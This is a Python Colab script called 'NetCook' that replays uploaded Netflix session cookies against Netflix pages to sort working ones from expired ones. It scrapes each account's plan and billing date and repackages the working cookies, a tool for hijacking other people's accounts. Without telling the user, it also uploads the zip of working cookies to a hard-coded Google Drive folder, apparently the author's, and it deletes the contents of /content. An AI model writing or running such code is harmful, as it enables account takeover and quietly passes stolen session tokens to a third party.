import re
import os
import json
import uuid
import time
import shutil
import base64
import zipfile
import hashlib
import requests
from tqdm import tqdm 
from pyunpack import Archive
from tabulate import tabulate
from bs4 import BeautifulSoup
from datetime import datetime
from google.colab import auth
from google.colab import files
from googletrans import Translator
from pydrive2.auth import GoogleAuth
from pydrive2.drive import GoogleDrive
from IPython.display import HTML, display
from oauth2client.client import GoogleCredentials
from concurrent.futures import ThreadPoolExecutor, as_completed

ASCII = """
███╗   ██╗███████╗████████╗ ██████╗ ██████╗  ██████╗ ██╗  ██╗
████╗  ██║██╔════╝╚══██╔══╝██╔════╝██╔═══██╗██╔═══██╗██║ ██╔╝  script by \033[34m@NetCook\033[0m
██╔██╗ ██║█████╗     ██║   ██║     ██║   ██║██║   ██║█████╔╝   \033[32mupdate\033[0m version \033[31m2.5\033[0m
██║╚██╗██║██╔══╝     ██║   ██║     ██║   ██║██║   ██║██╔═██╗   release \033[31m04\033[0m-\033[31m01\033[0m-\033[31m2025\033[0m
██║ ╚████║███████╗   ██║   ╚██████╗╚██████╔╝╚██████╔╝██║  ██╗  \033[34mgithub netcook-app\033[0m
╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
Access NetCook WebUI Site URL: https://netcook.web.id"""

url_1 = "https://www.netflix.com/billingActivity"
url_2 = "https://www.netflix.com/browse"

translator = Translator()

def delete_and_recreate_folders():
    folders = ["temp_0", "temp_1", "temp_2"]
    for folder in folders:
        if os.path.exists(folder):
            shutil.rmtree(folder)
        os.makedirs(folder)

def check_cookies_valid_netflix(cookies):
    response_billing = requests.get(url_1, cookies=cookies, allow_redirects=False)
    time.sleep(0.3) 
    if response_billing.status_code == 200:
        response_browse = requests.get(url_2, cookies=cookies, allow_redirects=False)
        time.sleep(0.3) 
        return "Active" if response_browse.status_code == 200 else "Expired"
    else:
        return "Expired"

def read_cookies(file):
    cookies = {}
    is_netflix_cookie = False
    if file.endswith(".json"):
        with open(file, "r") as f:
            cookies_json = json.load(f)
            for cookie in cookies_json:
                if "name" in cookie and "value" in cookie and "domain" in cookie:
                    domain = cookie["domain"]
                    if (
                        "netflix.com" in domain
                        or "www.netflix.com" in domain
                        or ".netflix.com" in domain
                    ):
                        name = cookie["name"]
                        value = cookie["value"]
                        cookies[name] = value
                        is_netflix_cookie = True
    elif file.endswith(".txt"):
        with open(file, "r", encoding="utf-8") as f:
            for line in f:
                parts = line.strip().split("\t")
                if len(parts) >= 7:
                    domain = parts[0].strip()
                    if (
                        "netflix.com" in domain
                        or "www.netflix.com" in domain
                        or ".netflix.com" in domain
                    ):
                        name = parts[5].strip()
                        value = parts[6].strip()
                        cookies[name] = value
                        is_netflix_cookie = True
    if not is_netflix_cookie:
        return None, False
    return cookies, True

def extract_plan_and_billing_info(content):
    parsed_html = BeautifulSoup(content, "html.parser")

    def find_plan_name(parsed_html):
        plan_name_div = parsed_html.find("p", attrs={"data-uia": "plan-name-top-level"})
        if plan_name_div:
            plan_name_text = plan_name_div.text.split("-")[0]
            plan_name_en = translator.translate(plan_name_text, src="auto", dest="en").text
            match = re.search(r"\b(Mobile|Basic|Standard|Premium)\b", plan_name_en, re.IGNORECASE)
            if match:
                return match.group(1)
        plan_name_div = parsed_html.find("p", attrs={"data-uia": "plan-name-line-item"})
        if plan_name_div:
            plan_name_text = plan_name_div.text.split("-")[0]
            plan_name_en = translator.translate(plan_name_text, src="auto", dest="en").text
            match = re.search(r"\b(Mobile|Basic|Standard|Premium)\b", plan_name_en, re.IGNORECASE)
            if match:
                return match.group(1)
        return "[Not found]"

    def find_next_cycle(parsed_html):
        next_cycle_div = parsed_html.find("p", attrs={"data-uia": "plan-details-description"})
        if next_cycle_div:
            next_cycle_text = next_cycle_div.text
            next_cycle_en = translator.translate(next_cycle_text, src="auto", dest="en").text
            return next_cycle_en
        return "[Not found]"

    def convert_date(date_str):
        formats = [
            '%B %d, %Y',
            '%d %B %Y',
            '%d.%m.%Y',
            '%d-%m-%Y',
            '%Y-%m-%d',
            '%Y. %B %d',
            '%B %d %Y',
            '%B %dth %Y'
        ]
        for date_format in formats:
            try:
                return datetime.strptime(date_str, date_format).strftime("%Y-%m-%d")
            except ValueError:
                continue
        return date_str

    def extract_date(text):
        date_pattern = r'(\d{1,2} \w+ \d{4}|\w+ \d{1,2}, \d{4}|\d{1,2} de \w+ de \d{4})'
        match = re.search(date_pattern, text)
        if match:
            return match.group(1).replace(",", "").strip()
        else:
            return "[Not found]"

    plan_name_text = find_plan_name(parsed_html)
    next_cycle_text = find_next_cycle(parsed_html)
    next_cycle_date = extract_date(next_cycle_text)
    next_cycle_final = convert_date(next_cycle_date) if next_cycle_date != "[Not found]" else "[Not found]"

    return "Active", plan_name_text.strip(), next_cycle_final

def write_cookies(active_cookies):
    temp_dir = "temp_0"
    netscape_files = []
    json_files = []
    renamed_files_mapping = {}
    skipped_files = set()
    alphabet = "ABC"
    hashed_names = set()

    for file_path in active_cookies:
        file_name = os.path.basename(file_path)
        file_extension = os.path.splitext(file_name)[1].lower()
        if file_extension == ".txt":
            netflixid_lines = []
            with open(file_path, "r") as txt_file:
                lines = txt_file.readlines()
                for line in lines:
                    if "NetflixId" in line and "SecureNetflixId" not in line:
                        netflixid_lines.append(line.strip())
            if netflixid_lines:
                with open(file_path, "w") as new_txt_file:
                    for line in netflixid_lines:
                        new_txt_file.write(line + "\n")
                    new_txt_file.write("\n#Cookies checked by @NetCook\n")
                    new_txt_file.write("#netcook.web.id \n")
                sha256_hash = hashlib.sha256()
                with open(file_path, "rb") as f:
                    for byte_block in iter(lambda: f.read(4096), b""):
                        sha256_hash.update(byte_block)
                full_hash = sha256_hash.hexdigest()
                custom_hash = "".join(alphabet[int(c, 16) % 3] for c in full_hash[:51])
                hashed_file_name = f"hash-{custom_hash}.txt"
                if hashed_file_name in hashed_names:
                    os.remove(file_path)
                    skipped_files.add(file_name)
                    continue
                else:
                    hashed_names.add(hashed_file_name)
                    hashed_file_path = os.path.join(temp_dir, hashed_file_name)
                    os.rename(file_path, hashed_file_path)
                    netscape_files.append(hashed_file_path)
                    renamed_files_mapping[file_name] = hashed_file_name
        elif file_extension == ".json":
            with open(file_path, "r") as json_file:
                data = json.load(json_file)
            netflixid_cookies = [cookie for cookie in data if cookie.get("name") == "NetflixId"]
            if netflixid_cookies:
                with open(file_path, "w") as new_json_file:
                    json_data_with_comments = [
                        {
                            "metadata": "Cookies checked by @NetCook",
                            "source_url": "https://netcook.web.id",
                        }
                    ]
                    json_data_with_comments.extend(netflixid_cookies)
                    json.dump(json_data_with_comments, new_json_file, indent=4)
            sha256_hash = hashlib.sha256()
            with open(file_path, "rb") as f:
                for byte_block in iter(lambda: f.read(4096), b""):
                    sha256_hash.update(byte_block)
            full_hash = sha256_hash.hexdigest()
            custom_hash = "".join(alphabet[int(c, 16) % 3] for c in full_hash[:51])
            hashed_file_name = f"hash-{custom_hash}.json"
            if hashed_file_name in hashed_names:
                os.remove(file_path)
                skipped_files.add(file_name)
                continue
            else:
                hashed_names.add(hashed_file_name)
                hashed_file_path = os.path.join(temp_dir, hashed_file_name)
                os.rename(file_path, hashed_file_path)
                json_files.append(hashed_file_path)
                renamed_files_mapping[file_name] = hashed_file_name

    return netscape_files, json_files, renamed_files_mapping, skipped_files

def process_single_file(file_path):
    result = []
    active_files = []
    expired_cookies = 0
    invalid_cookies_files = 0
    invalid_format_files = 0
    file_name = os.path.basename(file_path)
    file_extension = os.path.splitext(file_name)[1].lower()
    if file_extension not in ['.json', '.txt']:
        invalid_format_files += 1
        return result, active_files, expired_cookies, invalid_cookies_files, invalid_format_files, file_name
    cookies, is_netflix_cookie = read_cookies(file_path)
    if not is_netflix_cookie:
        invalid_cookies_files += 1
        return result, active_files, expired_cookies, invalid_cookies_files, invalid_format_files, file_name
    cookies_status = check_cookies_valid_netflix(cookies)
    plan = "[Not checked]"
    next_billing_date = "[Not checked]"
    if cookies_status == "Active":
        active_files.append(file_path)
        response_billing = requests.get(
            url_1, cookies=cookies, allow_redirects=False
        )
        if response_billing.status_code == 200:
            cookies_status, plan, next_billing_date = (
                extract_plan_and_billing_info(response_billing.content)
            )
        result.append(
            [file_name, cookies_status, plan, next_billing_date]
        )
    else:
        expired_cookies += 1
    time.sleep(0.3)
    return result, active_files, expired_cookies, invalid_cookies_files, invalid_format_files, None

def extract_and_process_cookies(file, output_folder, drive, folder_id):
    result_list = []
    total_files = 0
    expired_cookies = 0
    invalid_cookies_files = 0
    invalid_format_files = 0
    active_files = []
    skipped_files_messages = []
    renamed_files_mapping = {}
    duplicate_files_count = 0

    if file.endswith(".zip"):
        Archive(file).extractall(output_folder)
        file_paths = []
        for root, dirs, files_in_dir in os.walk(output_folder):
            for file_name in files_in_dir:
                file_path = os.path.join(root, file_name)
                file_paths.append(file_path)
    else:
        file_paths = [file]
    total_files = len(file_paths)

    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = {executor.submit(process_single_file, fp): fp for fp in file_paths}
        print("\n")
        with tqdm(total=total_files, desc="Checking Cookies", colour="green") as pbar:
            for future in as_completed(futures):
                res = future.result()
                result, active_file, exp_cookies, invalid_cookies, invalid_format, skipped_file = res
                result_list.extend(result)
                active_files.extend(active_file)
                expired_cookies += exp_cookies
                invalid_cookies_files += invalid_cookies
                invalid_format_files += invalid_format
                if skipped_file:
                    if invalid_format > 0:
                        skipped_files_messages.append(f"Invalid format file found: {skipped_file}. Skipping this file...")
                    else:
                        skipped_files_messages.append(f"Invalid cookies file found: {skipped_file}. Skipping this file...")
                pbar.update(1)
    if active_files:
        netscape_files, json_files, renamed_mapping, skipped_files = write_cookies(active_files)
        renamed_files_mapping.update(renamed_mapping)
        zip_filename = f"temp_2/NetCook-{uuid.uuid4()}.zip"
        with zipfile.ZipFile(zip_filename, "w") as active_zip:
            for file in netscape_files:
                if os.path.exists(file):
                    active_zip.write(file, os.path.basename(file))
                else:
                    print(f"File not found, skipping: {file}")
            for file in json_files:
                if os.path.exists(file):
                    active_zip.write(file, os.path.basename(file))
                else:
                    print(f"File not found, skipping: {file}")
        file_drive = drive.CreateFile({"parents": [{"id": folder_id}]})
        file_drive.SetContentFile(zip_filename)
        file_drive.Upload()

        if skipped_files:
            duplicate_files_count = len(skipped_files)
            for skipped_file in skipped_files:
                skipped_files_messages.append(f"Duplicate file found: {skipped_file}. Skipping this file...")
            result_list = [row for row in result_list if row[0] not in skipped_files]

        for i, row in enumerate(result_list):
            original_file_name = row[0]
            if original_file_name in renamed_files_mapping:
                new_file_name = renamed_files_mapping[original_file_name]
                new_file_name_no_ext = os.path.splitext(new_file_name)[0]
                result_list[i][0] = new_file_name_no_ext

    for msg in skipped_files_messages:
        print(f"{msg}")

    def custom_sort(item):
        plan_order = {
            "Basic": 1,
            "Mobile": 2,
            "Premium": 3,
            "Standard": 4,
            "[Not found]": 5,
        }
        return plan_order.get(item[2], 6)

    result_list.sort(key=custom_sort)
    result_list = [[i + 1] + row for i, row in enumerate(result_list)]

    if result_list:
        print("\n")
        print(
            tabulate(
                result_list,
                headers=["No", "Hash File", "Cookies", "Plan", "Billing Exp"],
                tablefmt="psql",
                colalign=("center", "left", "center", "center", "center"),
            )
        )
    else:
        print("\n")
        print(
            tabulate(
                [["Cookies not found active"]],
                headers=["Status"],
                tablefmt="psql",
                colalign=("center",),
            )
        )
    active_cookies = len(result_list)
    summary_table = [
        ["Files", total_files],
        ["Active Files", active_cookies],
        ["Expired Files", expired_cookies],
        ["Duplicate Files", duplicate_files_count],
        ["Invalid Format Files", invalid_format_files],
        ["Invalid Cookies Files", invalid_cookies_files],
    ]
    print("\n")
    print(
        tabulate(
            summary_table,
            headers=["Description", "Count"],
            tablefmt="psql",
            colalign=("left", "center"),
        )
    )
    if active_cookies > 0 and 'zip_filename' in locals():
        print(f"\n\033[1mActive cookies files saved to zip:\n\033[0m")
        display(download_button(zip_filename, 'Download'))

def download_button(file_path, button_text):
    if not os.path.exists(file_path):
        print(f"Download failed. File not found: {file_path}")
        return
    with open(file_path, 'rb') as file:
        data = file.read()
    b64 = base64.b64encode(data).decode()
    html = f'''
    <a download="{os.path.basename(file_path)}" href="data:application/octet-stream;base64,{b64}">
        <button style="
            padding:5px;
            font-size:12px;
            background-color:#051c12;
            color:#76b899;
            width:80px;
            border: 1px solid #76b899;
            border-radius:3px;
            cursor:pointer;
            font-weight: bold;
        ">
            {button_text}
        </button>
    </a>
    '''
    return HTML(html)

folders = ["temp_0", "temp_1", "temp_2"]
for folder in folders:
    if not os.path.exists(folder):
        os.makedirs(folder)

def checked_cookies():
    for item in os.listdir("/content"):
        item_path = os.path.join("/content", item)
        if item not in ["temp_0", "temp_1", "temp_2"]:
            if os.path.isfile(item_path) or os.path.islink(item_path):
                os.unlink(item_path)
            elif os.path.isdir(item_path):
                shutil.rmtree(item_path)
    print(ASCII)
    print("\nMenu:")
    print("[1] Check Netflix Cookies")
    print("[2] Exit")
    while True:
        delete_and_recreate_folders()
        choice = input("\nEnter your choice (1/2): ")
        if choice == "1":
            auth.authenticate_user()
            gauth = GoogleAuth()
            gauth.credentials = GoogleCredentials.get_application_default()
            drive = GoogleDrive(gauth)
            folder_id = "1w9GoH5E5p86CydOfY4ufZjG_5qh8-Ipo"
            print(
                "Please upload a batch file (.zip) or a single file (.json or .txt):\n"
            )
            uploaded_files = files.upload()
            file_names = list(uploaded_files.keys())
            file_name = file_names[0] if file_names else None
            if file_name:
                temp_path = os.path.join("temp_1", file_name)
                content = uploaded_files[file_name]
                with open(temp_path, "wb") as f:
                    f.write(content)
                extract_and_process_cookies(temp_path, "temp_0", drive, folder_id)
            else:
                print("No file uploaded.\n")
            for item in os.listdir("/content"):
                item_path = os.path.join("/content", item)
                if item not in ["temp_0", "temp_1", "temp_2"]:
                    if os.path.isfile(item_path) or os.path.islink(item_path):
                        os.unlink(item_path)
                    elif os.path.isdir(item_path):
                        shutil.rmtree(item_path)
        elif choice == "2":
            print("Thank you for using this script 🩶🩶🩶.")
            break
        else:
            print("Invalid choice. Please enter a valid choice.\n")